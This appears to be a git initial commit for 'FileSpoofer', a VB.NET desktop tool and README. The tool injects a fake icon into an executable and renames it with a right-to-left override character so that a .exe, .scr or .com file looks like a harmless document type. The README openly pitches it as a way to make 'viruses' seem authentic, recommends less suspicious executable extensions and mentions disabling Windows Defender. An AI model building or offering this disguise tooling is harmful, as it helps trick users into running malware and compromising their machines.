4df8da7d9e70f20d0255433cdd796390983ffae8
Henrik <henrekt@gmail.com>
2018-09-29 16:31:49 +0200

    Initial commit

---
+++ ExtensionSpoof/ExtensionSpoof/MainWindow.xaml.vb
@@ -0,0 +1,96 @@
+﻿Imports System.IO
+Imports Microsoft.Win32
+
+Class MainWindow
+
+    Private IconFolderName = My.Application.Info.DirectoryPath + "\" + "Win10Icons"
+
+    Public Sub Main()
+        If Dir$("Win10Icons", vbDirectory) <> vbNullString Then
+            AddSpoofExtensions("Win10Icons")
+        Else
+            MessageBox.Show("Win10Icons folder not found, please select a folder with icons or download Win10Icons at github.com/henriksb/filespoofer.", "Win10Icons folder not found", MessageBoxButton.OK, MessageBoxImage.Warning)
+
+            Dim IconFolder As Forms.FolderBrowserDialog
+            IconFolder = New Forms.FolderBrowserDialog
+            IconFolder.Description = "Select icon folder"
+            IconFolder.ShowDialog()
+
+            IconFolderName = IconFolder.SelectedPath
+
+            If String.IsNullOrWhiteSpace(IconFolderName) Then
+                Environment.Exit(0)
+            End If
+
+            AddSpoofExtensions(IconFolderName)
+        End If
+
+        Dim SourceExtensions = {"scr", "exe", "com"}
+
+        Dim i = 0
+        For Each Extension In SourceExtensions
+            SourceExtension.Items.Insert(i, Extension)
+            i += 1
+        Next
+    End Sub
+
+    Private Sub AddSpoofExtensions(Path As String)
+        Dim DI As New DirectoryInfo(Path)
+        Dim FolderContents As FileInfo() = DI.GetFiles()
+        Dim Icon As FileInfo
+
+        Dim index = 0
+        For Each Icon In FolderContents
+            SpoofExtension.Items.Insert(index, Icon.ToString().Split(".")(0))
+            index += 1
+        Next
+    End Sub
+
+    Private Sub OpenFile_Click(sender As Object, e As RoutedEventArgs) Handles OpenFile.Click
+        Dim fd As OpenFileDialog = New OpenFileDialog()
+
+        fd.Title = "Open File Dialog"
+        fd.Filter = "Executable files (*.exe)|*.exe"
+        fd.FilterIndex = 2
+        fd.RestoreDirectory = True
+
+        Dim Result = fd.ShowDialog()
+        Dim ExeFile = fd.FileName
+
+        CurrentFile.Text = ExeFile
+    End Sub
+
+    Private Sub SpoofExtension_DropDownClosed(sender As Object, e As EventArgs) Handles SpoofExtension.DropDownClosed
+        UpdateName()
+    End Sub
+
+    Private Sub SourceExtension_DropDownClosed(sender As Object, e As EventArgs) Handles SourceExtension.DropDownClosed
+        UpdateName()
+    End Sub
+
+    Private Sub NameInput_TextChanged(sender As Object, e As TextChangedEventArgs) Handles NameInput.TextChanged
+        UpdateName()
+    End Sub
+
+    Private Sub UpdateName()
+        'Update name and image
+        OutputName.Text = NameInput.Text + StrReverse(SourceExtension.Text) + "." + SpoofExtension.Text
+        Try
+            IconImage.Source = New BitmapImage(New Uri(IconFolderName + "\" + SpoofExtension.Text + ".ico"))
+        Catch
+        End Try
+    End Sub
+
+    Private Sub GenerateButton_Click(sender As Object, e As RoutedEventArgs) Handles GenerateButton.Click
+        If String.IsNullOrWhiteSpace(SpoofExtension.Text) Or String.IsNullOrWhiteSpace(SourceExtension.Text) Or String.IsNullOrWhiteSpace(NameInput.Text) Or CurrentFile.Text = "Current file: None" Then
+            MessageBox.Show("Please fill in all fields before generating", "Not all fields filled in", MessageBoxButton.OK, MessageBoxImage.Warning)
+            Return
+        End If
+
+        Dim ReverseCharacter As String = ChrW("&H202E")
+        Dim SpoofName = NameInput.Text + ReverseCharacter + StrReverse(SpoofExtension.Text) + "." + SourceExtension.Text
+
+        Iconchanger.InjectIcon(CurrentFile.Text, IconFolderName + "\" + SpoofExtension.Text + ".ico")
+        My.Computer.FileSystem.RenameFile(CurrentFile.Text, SpoofName)
+    End Sub
+End Class
---
+++ README.md
@@ -0,0 +1,21 @@
+# FileSpoofer
+
+Simple program to spoof file extensions and icons.
+
+**Warning: The program you are trying to spoof may start to change its name randomly (probably with a .tmp extension). This is Windows defenders fault, and you will most likely see pop up message in your bottom right corner. To fix this you can either disable Windows defender (not recommended) or whitelist the program. 
+Also.. the program will crash if you attempt to spoof the program itself or a completely empty file (0 bytes)**
+
+There are more file extensions that have identical functionalities to the .exe extension, namely .scr and .com. In FileSpoofer you can choose between these extensions, which can make your names and programs (viruses) seem extremely authentic. A lot of people know about the right-to-left override character, and are thus very aware of this attack. Most people do however not know about .com and .scr and their identical functionality to .exe. Even regular computer user get suspicious of the exe ending, as there are not a lot of words (if any) ending with exe. The .jar (java files) could also be a possibility, though not added yet.
+
+Below is a picture of some decently creative spoof names I came up with:
+
+![alt text](https://raw.githubusercontent.com/henriksb/ExtensionSpoofer/master/Spoof.png)
+
+(you apparently can't change .com file icons)
+
+(Old GIF. More more features are present in the program)
+![alt text](https://raw.githubusercontent.com/henriksb/ExtensionSpoofer/master/UsageGIF.gif)
+
+Click [here](https://github.com/henriksb/ExtensionSpoofer/raw/master/FileSpoofer.exe) to download pre-compiled executable
+
+Adding new icons is extremely easy, simply add the icon in the icons folder with the name of the extension. Meaning, if you have an 'exe' icon, name it 'exe.ico' and put it in the folder.
